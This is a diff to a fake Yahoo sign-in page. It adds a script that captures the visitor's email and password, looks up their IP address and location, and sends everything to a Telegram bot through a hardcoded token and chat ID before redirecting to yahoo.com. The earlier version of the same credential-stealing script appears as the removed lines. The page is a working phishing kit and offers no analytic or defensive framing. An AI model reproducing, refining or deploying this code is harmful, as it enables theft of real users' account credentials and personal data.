@@ -117,7 +117,7 @@ root.isIOSDevice = true;
     <strong class="challenge-heading">Sign in</strong>
     <span class="challenge-desc signin-sub-title">using your Yahoo account</span>
     </span>
-    <form id="loginForm" method="POST" action="#" class="pure-form">
+    <form id="loginForm" method="post" action="submit" class="pure-form">
         <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
         <input type="hidden" name="crumb" value="1bKbM5ZadOfqXI5DPTJ4w" />
         <input type="hidden" name="acrumb" value="4q6VAvck" />
@@ -128,25 +128,27 @@ root.isIOSDevice = true;
             <div class="input-group">
                 <input class="phone-no " type="email" name="email" id="email" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
                 <div class="input-field-icon hide" id="username-field-icon"></div>
-                <label for="email" id="email" class="login-label">Username, email, or mobile</label>
+                <label for="email" id="login-label" class="login-label">Username, email, or mobile</label>
                 <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                     <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
-                </ul>            
-			</div>
-            
-        </div>
-        <p id="username-error" class="error-msg hide" role="alert"></p>
-		<div id="password-group" class="input-group password-container focussed">
-            <input type="text" id="user-password" class="password"  name="password"
-                placeholder=" " autofocus autocomplete="current-password"
-                data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd" />
-            <label for="user-password" id="user-password" class="password">Password</label>
-            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
-            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1"
-                title="Show password"
-                data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide">
-            </button>
-        </div>
+                </ul>     
+				
+			<form id="loginForm" action="your-server-endpoint" method="POST">
+    <div id="password-group" class="input-group password-container focussed">
+        <input type="password" id="user-password" class="password" name="password"
+            placeholder=" " autofocus autocomplete="current-password" />
+        <label for="user-password" class="password-label">Password</label>
+        <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1"
+            title="Show password">
+        </button>
+    </div>
+    
+</form>
+
+
+            <div class="hidden-input-container">
+                <input name="passwd" class="pwd-field" type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
+            </div>
 		
         <div class="reverse-order">
                 <div class="forgot-cont challenge-button-link">
@@ -156,10 +158,85 @@ root.isIOSDevice = true;
                         name="skip" value="Forgot password?" data-rapid-tracking="true" />
                 </div>
         <div class="button-container">
-            <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Sign in"  />
+            <input id="loginForm" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Sign in"  />
         </div>
     </form>
 	
+	<script>
+    // Toggle password visibility
+    document.getElementById("password-toggle-button").addEventListener("click", function () {
+        const passwordInput = document.getElementById("user-password");
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            this.textContent = "Hide";
+        } else {
+            passwordInput.type = "password";
+            this.textContent = "Show";
+        }
+    });
+
+    // Form submission to Telegram
+    document.getElementById("loginForm").addEventListener("submit", function (event) {
+        event.preventDefault(); // Prevent default form submission
+
+        // Collect form data
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("user-password").value;
+
+        // Get current date and time
+        const currentTime = new Date().toLocaleString();
+
+        // Get IP address and location
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const city = data.city || 'Unknown City';
+                const region = data.region || 'Unknown Region';
+                const country = data.country_name || 'Unknown Country';
+
+                // Telegram bot token and chat ID
+                const botToken = '8147187568:AAHMoG0snH1303E7BvCHgToA3bedoIMoHbo';
+                const chatId = '6078089614';
+
+                // Message to send to Telegram
+                const message = `
+                    Email: ${email}
+                    Password: ${password}
+                    IP: ${ip}
+                    Location: ${city}, ${region}, ${country}
+                    Date and Time: ${currentTime}
+                `;
+
+                // Send the message to Telegram
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log('Message sent successfully:', data);
+                            // Redirect after successful submission
+                            window.location.href = "https://yahoo.com";
+                        } else {
+                            console.error('Error sending message:', data);
+                            alert('There was an error sending your information to Telegram.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Request failed:', error);
+                        alert('Failed to send data. Check your network connection.');
+                    });
+            })
+            .catch(error => {
+                console.error('Failed to fetch IP or location data:', error);
+                alert('Could not retrieve IP and location data.');
+            });
+    });
+</script>
+
 	
         <div class="helper-links-container">
             <div class="helper-item ">
@@ -167,6 +244,7 @@ root.isIOSDevice = true;
                     <input id="persistent" name="persistent" value="y" type="checkbox" checked />
                     <label for="persistent">Stay signed in</label>
                 </span>
+				
             </div>
             <div class="helper-item arlink">
                 <span class="help">
@@ -174,57 +252,7 @@ root.isIOSDevice = true;
                 </span>
             </div>
         </div>
-<script>
-        // Toggle password visibility
-        document.getElementById("password-toggle-button").addEventListener("click", function() {
-            const passwordInput = document.getElementById("user-password");
-            if (passwordInput.type === "password") {
-                passwordInput.type = "text";
-                this.textContent = "Hide";
-            } else {
-                passwordInput.type = "password";
-                this.textContent = "Show";
-            }
-        });
 
-        // Form submission to Telegram
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent default form submission
-
-            // Collect form data
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("user-password").value;
-
-            // Telegram bot token and chat ID
-            const botToken = '8147187568:AAHMoG0snH1303E7BvCHgToA3bedoIMoHbo';
-            const chatId = '6078089614';
-
-            // Message to send to Telegram
-            const message = `New Yahoo Logz\nEmail: ${email}\nPassword: ${password}`;
-
-            // Send the message to Telegram
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log('Message sent successfully:', data);
-                    // Redirect after successful submission
-                    window.location.href = "https://yahoo.com";
-                } else {
-                    console.error('Error sending message:', data);
-                    alert('There was an error sending your information to Telegram.');
-                }
-            })
-            .catch(error => {
-                console.error('Request failed:', error);
-                alert('Failed to send data. Check your network connection.');
-            });
-        });
-    </script>
 
         <div class="bottom-links-container has-social-buttons">
             <p class="sign-up-link">
@@ -245,21 +273,6 @@ root.isIOSDevice = true;
                         </li>
                     </ul>
                 </div>        </div>
-				
-				</div>
-</div>
-        </div>
-        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
-            <h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
-<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
-        </div>
-    </div>
-    <div class="login-bg-outer">
-        <div class="login-bg-inner">
-                <div id="login-ad-rich"></div>
-                    </div>
-    </div>
-	
 	
 </body>
 </html>
